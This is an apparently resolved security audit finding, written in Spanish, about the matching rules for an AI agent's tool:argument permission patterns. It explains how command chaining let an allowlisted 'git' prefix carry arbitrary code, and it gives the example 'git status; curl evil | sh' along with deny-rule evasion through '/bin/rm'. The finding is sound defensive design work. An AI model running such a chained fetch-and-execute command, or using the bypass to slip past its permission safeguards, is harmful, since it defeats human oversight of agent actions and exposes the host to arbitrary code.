---
title: "La semántica de emparejamiento de los patrones de permiso `tool[:argumento]` no está especificada, y en `bash` el encadenamiento la vuelve una frontera falsa"
type: "hallazgo"
id: "G53"
status: "resuelto"
date: "2026-07-16"
origin: "auditoría de seguridad 2026-07-16 (SEC-02)"
resolution: "Los permisos tool:argumento se especifican como glob anclado y bash se descompone por operadores, con fail-closed ante lo no modelable."
affected: ["agente.md §5", "chat.md §5", "guia-plugins.md"]
adr: "ADR-023"
---
# G53 · La semántica de emparejamiento de los patrones de permiso `tool[:argumento]` no está especificada, y en `bash` el encadenamiento la vuelve una frontera falsa — `agente.md` §5 / `chat.md` §5 / `guia-plugins.md` — **RESUELTO**

**Resolución** (2026-07-16; aplicada en [agente.md](../contracts/agente.md) §5 —la
especificación—, [chat.md](../contracts/chat.md) §5, [guia-plugins.md](../contracts/guia-plugins.md)
§5 y [arquitectura.md](../core/arquitectura.md) —el ejemplo MCP pasa a allows de
nombre exacto—; doctrina registrada en [ADR-023](../decisions/adr/README.md); la alternativa
mayor, pospuesta como [P39](../postponed/pospuesto.md)). **Modelo Claude Code adaptado** — el matcher del
harness de referencia, ajustado a la doctrina fail-closed del proyecto. La
semántica de match pasa de implícita a contrato: patrón sin `:` = nombre
exacto de la tool; `tool:arg` = glob anclado (`*` ⇒ `.*`, `^…$`, resto
literal) sobre la representación textual del argumento principal. Para
`bash`, el comando se **descompone por operadores** (`&&`, `||`, `;`, `|`,
`|&`, `&`, saltos de línea) con un tokenizador que modela solo palabras
planas y strings entre comillas: un `allow` concede **solo si cada
subcomando** casa algún patrón (`git status; curl evil | sh` ya no entra por
`bash:git *`), y todo constructo no modelable — `$( )`, backticks, `$VAR` en
posición de comando, redirecciones, heredocs, subshells/llaves, comillas
desbalanceadas — hace **fail-closed** hacia `ask` (deny en headless); la
lista de constructos modelables es **cerrada por contrato** (doctrina P17).
`deny` casa si **algún** subcomando casa, conserva su precedencia absoluta y
queda documentado como best-effort (doctrina G16). El contrato añade la
**advertencia honesta** (ningún patrón acota lo que un binario permitido
ejecuta por dentro — hooks de git, `postinstall`—; la valla dura son los
workers con `caps`), y la UX de "permitir siempre" persiste reglas **por
subcomando**, no el string encadenado (P29). **Sin cambios en `api.md` ni
bump de `enu.version.api`**: los permisos son vocabulario de producto y viven
en la extensión — confirmado por el juez de filosofía al validar la
propuesta. (Origen: SEC-02 de la
[auditoría de seguridad](../audits/auditoria-seguridad-2026-07-16.md).)

**Problema.** Ningún documento fija el algoritmo con que un permiso `allow`/`deny`
de la forma `tool:argumento` casa contra una petición concreta. Con emparejamiento
por glob sobre el string crudo del comando —el comportamiento implícito hoy—,
`allow='bash:git *'` autoriza de facto `bash:*`: basta encadenar
(`git status; curl evil | sh`) para que el prefijo casado arrastre un comando
arbitrario. Simétricamente, `deny='bash:rm *'` se evade con `/bin/rm` o `rm-alias`.
Es la defensa **anunciada** contra prompt injection en un agente headless de CI.
Detectado en SEC-02 de la auditoría de seguridad (2026-07-16), confirmado tras
verificación adversarial doble.

**Impacto.** El modelo de permisos, que es la barrera entre "el LLM propone" y
"la máquina ejecuta", no ofrece la garantía que su sintaxis sugiere. Un allow
razonable concede ejecución arbitraria; un deny razonable no cierra lo que nombra.

**Opciones.** (a) Glob sobre el string crudo + advertencia de no-frontera
(descartada: documenta la grieta en vez de cerrarla — el allowlist seguiría
concediendo ejecución arbitraria justo en el contexto headless que §5
presume proteger). (b) Emparejar contra el **programa parseado** con un
parser de bash completo (pospuesta como P39: proyecto de seguridad en sí,
primitiva de kernel con un único consumidor). (c) **Descomposición por
operadores con tokenizador cerrado y fail-closed** (elegida: cierra el
vector real — el encadenamiento — sin prometer un parser de bash; lo que no
se modela cae a `ask`, no a conceder).
